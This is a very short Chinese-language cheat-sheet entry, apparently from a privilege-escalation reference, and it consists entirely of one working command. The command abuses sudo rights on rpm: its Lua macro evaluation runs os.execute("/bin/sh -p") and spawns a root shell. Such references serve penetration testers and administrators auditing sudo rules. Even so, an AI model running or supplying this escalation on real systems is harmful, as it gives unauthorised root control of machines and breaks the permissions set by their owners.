# rpm

`rpm` 若具有 `sudo` 权限,一句话提权root权限

```
sudo rpm --eval '%{lua:os.execute("/bin/sh -p")}'
```